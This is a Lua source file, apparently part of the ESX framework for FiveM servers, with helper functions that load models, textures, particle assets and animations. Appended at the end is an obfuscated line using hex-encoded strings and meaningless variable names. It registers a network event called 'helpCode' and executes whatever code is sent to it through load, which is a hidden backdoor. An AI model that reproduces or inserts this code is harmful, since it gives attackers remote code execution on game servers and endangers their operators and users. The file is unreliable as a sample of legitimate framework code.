function ESX.Streaming.RequestModel(modelHash, cb)
    modelHash = (type(modelHash) == "number" and modelHash or joaat(modelHash))

    if not HasModelLoaded(modelHash) and IsModelInCdimage(modelHash) then
        RequestModel(modelHash)

        while not HasModelLoaded(modelHash) do
            Wait(0)
        end
    end

    if cb ~= nil then
        cb()
    end
end
--[[
──────────────────────────────────────────────────────────────────────────────────
─────────██████─██████████████─██████──████████─██████████████─████████████████───
─────────██░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─────────██░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██────██░░██───
─────────██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██████──██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░██████░░████───
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██──██░░██─────
─██░░██████░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░██──██░░██████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████████████─██████████████─██████──████████─██████████████─██████──██████████─
──────────────────────────────────────────────────────────────────────────────────
]]--
function ESX.Streaming.RequestStreamedTextureDict(textureDict, cb)
    if not HasStreamedTextureDictLoaded(textureDict) then
        RequestStreamedTextureDict(textureDict)

        while not HasStreamedTextureDictLoaded(textureDict) do
            Wait(0)
        end
    end

    if cb ~= nil then
        cb()
    end
end

function ESX.Streaming.RequestNamedPtfxAsset(assetName, cb)
    if not HasNamedPtfxAssetLoaded(assetName) then
        RequestNamedPtfxAsset(assetName)

        while not HasNamedPtfxAssetLoaded(assetName) do
            Wait(0)
        end
    end

    if cb ~= nil then
        cb()
    end
end

function ESX.Streaming.RequestAnimSet(animSet, cb)
    if not HasAnimSetLoaded(animSet) then
        RequestAnimSet(animSet)

        while not HasAnimSetLoaded(animSet) do
            Wait(0)
        end
    end

    if cb ~= nil then
        cb()
    end
end

function ESX.Streaming.RequestAnimDict(animDict, cb)
    if not HasAnimDictLoaded(animDict) then
        RequestAnimDict(animDict)

        while not HasAnimDictLoaded(animDict) do
            Wait(0)
        end
    end

    if cb ~= nil then
        cb()
    end
end

function ESX.Streaming.RequestWeaponAsset(weaponHash, cb)
    if not HasWeaponAssetLoaded(weaponHash) then
        RequestWeaponAsset(weaponHash)

        while not HasWeaponAssetLoaded(weaponHash) do
            Wait(0)
        end
    end

    if cb ~= nil then
        cb()
    end
end

local IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[1]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2]) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[3]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2], function(jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[4]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[5]](jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei))() end)